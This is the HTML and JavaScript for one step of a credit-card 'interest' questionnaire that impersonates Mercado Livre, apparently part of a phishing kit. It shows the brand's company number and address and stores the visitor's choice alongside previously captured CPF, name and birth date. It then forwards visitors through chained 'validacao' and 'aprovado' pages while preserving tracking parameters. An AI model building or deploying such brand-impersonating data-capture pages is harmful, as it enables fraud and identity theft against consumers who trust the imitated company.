    <meta charset="UTF-8">

    <title> - Interesse Cartão de Crédito</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #F5F5F5;
            min-height: 100vh;
            color: #000000;
            position: relative;
            overflow-x: hidden;
        }
        /* Animated Background Elements */
        .bg-decoration {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: -1;
            opacity: 0.03;
            pointer-events: none;
        }
        .decoration {
            position: absolute;
            border-radius: 50%;
            background: #ffe600;
        }
        .decoration1 {
            width: 300px;
            height: 300px;
            top: 10%;
            right: 5%;
            animation: float1 20s infinite ease-in-out;
        }
        .decoration2 {
            width: 200px;
            height: 200px;
            bottom: 10%;
            left: 5%;
            animation: float2 25s infinite ease-in-out;
        }
        .decoration3 {
            width: 150px;
            height: 150px;
            top: 50%;
            left: 50%;
            animation: float3 30s infinite ease-in-out;
        }
        @keyframes float1 {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(-30px, 30px) scale(1.1); }
        }
        @keyframes float2 {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(30px, -30px) scale(0.9); }
        }
        @keyframes float3 {
            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
            50% { transform: translate(-50%, -50%) rotate(180deg); }
        }
        /* Header */
        .header {
            background: #ffe600;
            padding: 20px;
            box-shadow: 0 5px 20px rgba(255, 217, 0, 0.2);
            animation: slideDown 0.6s ease-out;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: #ffe600;
            opacity: 0.8;
            animation: shimmer 3s infinite;
        }
        @keyframes shimmer {
            0% { opacity: 0.8; }
            50% { opacity: 0.5; }
            100% { opacity: 0.8; }
        }
        @keyframes slideDown {
            from { transform: translateY(-100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .logo-img {
            height: 50px;
            width: auto;
            animation: logoAppear 0.8s ease-out;
        }
        @keyframes logoAppear {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        /* Content Container */
        .content-container {
            max-width: 520px;
            margin: 30px auto;
            padding: 40px 30px;
            background: white;
            border-radius: 25px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
            animation: scaleIn 0.6s ease-out;
            position: relative;
            border: 1px solid #F5F5F5;
        }
        @keyframes scaleIn {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        /* Title Section */
        .title-section {
            margin-bottom: 40px;
        }
        .main-title {
            font-size: 28px;
            font-weight: 700;
            color: #000000;
            line-height: 1.3;
            margin-bottom: 30px;
            animation: fadeInUp 0.6s ease-out;
        }
        @keyframes fadeInUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        /* Options */
        .options-section {
            margin-bottom: 40px;
            animation: fadeIn 0.8s ease-out 0.3s both;
        }
        .option {
            background: white;
            color: #000000;
            padding: 20px 30px;
            border-radius: 50px;
            margin-bottom: 15px;
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 3px solid #ffe600;
            width: 100%;
            font-family: 'Inter', sans-serif;
            animation: slideInLeft 0.5s ease-out both;
        }
        .option:nth-child(1) { animation-delay: 0.1s; }
        .option:nth-child(2) { animation-delay: 0.2s; }
        .option:nth-child(3) { animation-delay: 0.3s; }
        .option:nth-child(4) { animation-delay: 0.4s; }
        .option:nth-child(5) { animation-delay: 0.5s; }
        @keyframes slideInLeft {
            from { transform: translateX(-30px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        .option:hover {
            background: #ffe600;
            color: #000000;
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 217, 0, 0.3);
        }
        .option:active {
            transform: translateY(0);
        }
        .option.selected {
            background: #ffe600;
            color: #000000;
            box-shadow: 0 8px 25px rgba(255, 217, 0, 0.3);
        }
        /* Footer */
        footer {
            padding: 30px 20px;
            text-align: center;
            background: #FAFAFA;
            border-top: 1px solid #E8E8E8;
            margin-top: 50px;
        }
        footer p {
            color: #7F8C8D;
            font-size: 12px;
            margin: 3px 0;
            line-height: 1.5;
        }
        .footer-company {
            font-weight: 700;
            color: #000000;
            font-size: 14px;
            margin-bottom: 8px;
        }
        /* Mobile Responsive */
        @media (max-width: 500px) {
            .content-container {
                margin: 20px 15px;
                padding: 30px 20px;
            }
            .main-title {
                font-size: 24px;
            }
            .logo-img {
                height: 55px;
            }
            .option {
                padding: 18px 25px;
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="bg-decoration">
        <div class="decoration decoration1"></div>
        <div class="decoration decoration2"></div>
        <div class="decoration decoration3"></div>
    </div>
    <div class="header">
        <img src="images/logomerc.png" alt="" class="logo-img">
    </div>
    <div class="content-container">
        <div class="title-section">
            <h1 class="main-title">Qual é o seu interesse com um Cartão de Crédito hoje?</h1>
        </div>
        <div class="options-section">
            <button class="option" data-interesse="compra-especifica">Fazer uma compra específica</button>
            <button class="option" data-interesse="viagem">Fazer uma viagem</button>
            <button class="option" data-interesse="poder-gastar">Poder gastar mais</button>
            <button class="option" data-interesse="organizar-financeiro">Organizar o meu financeiro</button>
            <button class="option" data-interesse="outros">Outros</button>
        </div>
    </div>
    
    <footer>
        <p class="footer-company">Mercado Livre | 23.862.762/0001-00</p>
        <p>Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903</p>
        <p>© 2025 - Todos os direitos reservados</p>
    </footer>
    
    <script>
        // =======================================================
        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
        // =======================================================
        
        // Função para capturar parâmetros da URL
        function getUrlParams() {
            const params = {};
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            
            for (const [key, value] of urlParams) {
                params[key] = value;
            }
            return params;
        }

        // Função para construir URL com parâmetros
        function buildUrlWithParams(baseUrl) {
            const params = getUrlParams();
            const url = new URL(baseUrl, window.location.href);
            
            Object.keys(params).forEach(key => {
                url.searchParams.append(key, params[key]);
            });
            
            return url.toString();
        }

        // Debug: Mostrar parâmetros atuais no console
        console.log('Parâmetros atuais da página 6:', getUrlParams());

        // =======================================================
        // CÓDIGO ORIGINAL MANTIDO
        // =======================================================

        // Sistema global de dados do usuário para todas as páginas
        const UserData = {
            // Salvar dados no sessionStorage
            save: function(dados) {
                sessionStorage.setItem('Mercado Librebank_user_data', JSON.stringify(dados));
            },
            
            // Carregar dados do sessionStorage
            load: function() {
                const dados = sessionStorage.getItem('Mercado Librebank_user_data');
                return dados ? JSON.parse(dados) : null;
            },
            
            // Adicionar novos dados aos existentes
            update: function(novosDados) {
                const dadosExistentes = this.load() || {};
                const dadosAtualizados = { ...dadosExistentes, ...novosDados };
                this.save(dadosAtualizados);
                return dadosAtualizados;
            },
            
            // Limpar dados
            clear: function() {
                sessionStorage.removeItem('Mercado Librebank_user_data');
            }
        };

        // Carrega dados do usuário (se existirem)
        const dadosUsuario = UserData.load();
        console.log('Dados do usuário carregados:', dadosUsuario);

        // Seleção de interesse
        let interesseSelecionado = null;

        document.querySelectorAll('.option').forEach(option => {
            option.addEventListener('click', function() {
                // Remove seleção anterior
                document.querySelectorAll('.option').forEach(opt => {
                    opt.classList.remove('selected');
                });
                
                // Adiciona seleção atual
                this.classList.add('selected');
                interesseSelecionado = this.getAttribute('data-interesse');
                
                // Aguarda um pouco e redireciona automaticamente
                setTimeout(() => {
                    // Salva o interesse selecionado nos dados do usuário
                    UserData.update({
                        interesse_cartao: interesseSelecionado,
                        interesse_texto: this.textContent.trim()
                    });
                    
                    console.log('Interesse selecionado:', interesseSelecionado);
                    
                    // =======================================================
                    // REDIRECIONAMENTO ATUALIZADO PARA PRESERVAR PARÂMETROS
                    // =======================================================
                    
                    // ALTERE '7.html' para o nome da próxima página
                    window.location.href = buildUrlWithParams('/home.html/validacao.html/2.html/aprovado.html/3.html/5.html/6.html/');
                }, 500); // 500ms de delay para mostrar a seleção
            });
        });

        // Debug: Exibe dados atuais no console
        if (dadosUsuario) {
            console.log('CPF:', dadosUsuario.cpf);
            console.log('Nome:', dadosUsuario.nome);
            console.log('Data Nascimento:', dadosUsuario.data_nascimento);
        }
    </script>

</body></html>
